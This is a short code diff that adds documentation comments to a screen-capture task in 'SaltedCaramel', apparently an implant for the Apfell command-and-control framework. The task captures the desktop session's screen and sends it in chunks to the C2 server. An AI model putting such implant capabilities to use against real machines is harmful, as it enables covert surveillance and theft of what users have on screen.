@@ -14,6 +14,12 @@ namespace SaltedCaramel.Tasks
 {
     public class ScreenCapture
     {
+        /// <summary>
+        /// Capture the screen associated with the current
+        /// desktop session.
+        /// </summary>
+        /// <param name="job">Job associated with this task.</param>
+        /// <param name="implant">Agent associated with this task.</param>
         public static void Execute(Job job, SCImplant implant)
         {
             SCTask task = job.Task;
@@ -32,7 +38,12 @@ namespace SaltedCaramel.Tasks
         }
 
 
-        // Same workflow as sending a file to Apfell server, but we only use one chunk
+        /// <summary>
+        /// Send a chunked screenshot response to the Apfell server.
+        /// </summary>
+        /// <param name="implant">Agent that will be sending the data.</param>
+        /// <param name="task">Task associated with the screenshot.</param>
+        /// <param name="screenshot">Byte array of data that holds a chuked screenshot response.</param>
         private static void SendCapture(SCImplant implant, SCTask task, byte[] screenshot)
         {
             try // Try block for HTTP request
